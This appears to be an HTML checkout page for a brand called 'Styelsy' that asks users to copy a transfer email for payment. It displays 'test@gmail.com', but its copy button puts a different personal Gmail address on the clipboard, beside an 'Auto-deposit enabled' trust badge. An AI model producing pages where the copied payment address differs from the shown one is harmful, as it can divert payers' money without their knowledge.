<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Styelsy Checkout</title>
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #0d0d0f; /* Deep dark background */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #ffffff;
        }
        .card {
            background: #1a1a1d;
            padding: 40px 25px;
            border-radius: 16px;
            border: 1px solid #333;
            box-shadow: 0 10px 40px rgba(255, 0, 127, 0.15); /* Subtle pink underglow */
            width: 100%;
            max-width: 360px;
        }
        .neon-logo {
            font-family: 'Dancing Script', cursive;
            font-size: 4rem;
            margin: 0 0 10px 0;
            color: #fff;
            /* Recreating the physical neon sign glow */
            text-shadow:
                0 0 5px #fff,
                0 0 10px #fff,
                0 0 20px #ff007f,
                0 0 40px #ff007f,
                0 0 80px #ff007f;
        }
        p.subtitle {
            color: #a0a0a5;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .email-display-box {
            background: #000000;
            border: 1px solid #444;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            color: #ff99cc;
            margin-bottom: 25px;
            letter-spacing: 0.5px;
        }
        button {
            width: 100%;
            padding: 16px;
            background-color: transparent;
            color: #ff007f;
            border: 2px solid #ff007f;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(255, 0, 127, 0.2);
        }
        button:hover, button.clicked {
            background-color: #ff007f;
            color: #ffffff;
            box-shadow: 0 0 25px rgba(255, 0, 127, 0.5);
        }
        .trust-badge {
            margin-top: 25px;
            font-size: 13px;
            color: #4ade80; /* Soft green */
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        /* Hide the actual image tag for now since we are using the CSS neon logo */
        .actual-image-logo {
            display: none; 
            width: 100%;
            border-radius: 8px;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1 class="neon-logo">Styelsy</h1>
        
        <p class="subtitle">Tap below to copy the transfer email.</p>
        
        <div class="email-display-box">
            test@gmail.com
        </div>
        
        <button id="copyBtn" onclick="copyEmail('Nigelmahedran@gmail.com')">Copy Email Address</button>
        
        <div class="trust-badge">
            🔒 Auto-deposit enabled
        </div>
    </div>

    <script>
        function copyEmail(email) {
            navigator.clipboard.writeText(email).then(() => {
                const btn = document.getElementById('copyBtn');
                
                // Change button state to show success
                btn.innerText = 'Copied! ✅';
                btn.classList.add('clicked');
                
                // Revert back after 3 seconds
                setTimeout(() => {
                    btn.innerText = 'Copy Email Address';
                    btn.classList.remove('clicked');
                }, 3000);
            }).catch(err => {
                console.error('Failed to copy text: ', err);
                alert("Please manually copy the email from the box above.");
            });
        }
    </script>

</body>
</html>
